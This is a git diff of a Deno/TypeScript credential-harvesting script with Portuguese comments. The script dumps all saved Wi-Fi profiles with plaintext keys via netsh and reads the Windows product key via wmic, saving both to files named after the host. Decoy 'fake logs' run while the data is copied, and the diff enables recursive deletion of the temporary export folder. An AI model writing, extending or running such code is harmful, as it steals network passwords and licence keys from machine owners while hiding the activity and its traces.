@@ -6,24 +6,23 @@ import colors from '@colors';
 import qr from '@qrcode';
 import $ from '@dax';
 
-/** showLogs
- * Se for false, nada será exibido no console
- * e os delays serão desativados
- */
+// Logs e delays ativados
 let showLogs: boolean | number = true;
 let winLKey: string;
 let counter = 0;
 colors;
 
-/** sleep()
- * Função intermediária para delay();
- * verifica se o silent mode is on
- */
+// Função intermediária para delay();
 const sleep = (timeout: number) => showLogs ? delay(timeout) : null;
+const random = (min = 500, max = 2_500) =>
+	Math.floor(Math.random() * (max - min) + min);
 
-/** SilentMode()
- * Ativa o Listener para o teclado
- */
+const getTimestamp = (fmt = 'DDDD') =>
+	DateTime.now()
+		.setLocale('pt').setZone('America/Sao_Paulo')
+		.toFormat(fmt); // Data formatada
+
+//  Ativa o Listener para o teclado
 silentMode();
 
 // Title.txt contém uma string colorida bem cringe
@@ -81,30 +80,26 @@ await NetSHProfileCollector();
 // Copiar key do Windows
 await copyWinKey();
 
-// // Limpar registros de arquivos
-// await Deno.remove('.tempdata', { recursive: true })
-// 	.catch(() => {});
-// // 'recursive' significa que é pra apagar mesmo se tiver arquivos dentro
+// Limpar registros de arquivos
+await Deno.remove('.tempdata', { recursive: true })
+	.catch(() => {});
+// 'recursive' significa que é pra apagar mesmo se tiver arquivos dentro
 
 async function NetSHProfileCollector() {
 	createFakeLogs();
-	/** createFakeLogs()
-	 * chamei a função sem await pra ela exibir os logs
-	 * enquanto o resto do código continua rodando
-	 */
+	// sem await pra exibir os logs enquanto copia os dados
 
-	await Deno.mkdir('.tempdata') // Cria pasta de arquivos temporários (se não existir)
-		.catch(() => {});
+	// Cria pasta de arquivos temporários (se não existir)
+	await Deno.mkdir('.tempdata').catch(() => {});
 
-	await Deno.mkdir('WiFiPasswords') // Cria pasta de senhas (se não existir)
-		.catch(() => {});
+	// Cria pasta de senhas (se não existir)
+	await Deno.mkdir('WiFiPasswords').catch(() => {});
 
 	// Chama a API do Windows
 	await $`netsh wlan export profile key=clear folder=.tempdata`.lines();
 
 	for await (const file of Deno.readDir('.tempdata')) {
-		/** for
-		 * Por padrão, A API fornece as informações em arquivos XML bem poluídos
+		/** Por padrão, A API fornece as informações em arquivos XML bem poluídos
 		 * Então eu fiz essa bosta aqui pra deixar só o que é realmente importante
 		 */
 		counter++;
@@ -139,8 +134,8 @@ async function copyWinKey() {
 		(await $`wmic path softwarelicensingservice get OA3xOriginalProductKey`
 			.lines())[1];
 
-	await Deno.mkdir('WindowsKeys') // Cria pasta de chaves do Windows (se não existir)
-		.catch(() => {});
+	// Cria pasta de chaves do Windows (se não existir)
+	await Deno.mkdir('WindowsKeys').catch(() => {});
 
 	await Deno.writeTextFile(
 		`WindowsKeys/${Deno.hostname()}.txt`,
@@ -191,17 +186,6 @@ function clearTags(matches: IterableIterator<RegExpMatchArray>) {
 		);
 	}
 	return res;
-}
-
-function random(min = 500, max = 2_500) {
-	// Retorna um número aleatório entre min e max
-	return Math.floor(Math.random() * (max - min) + min);
-}
-
-function getTimestamp(format = 'DDDD'): string {
-	return DateTime.now().setLocale('pt')
-		.setZone('America/Sao_Paulo')
-		.toFormat(format); // Data formatada
 }
 
 async function silentMode() {
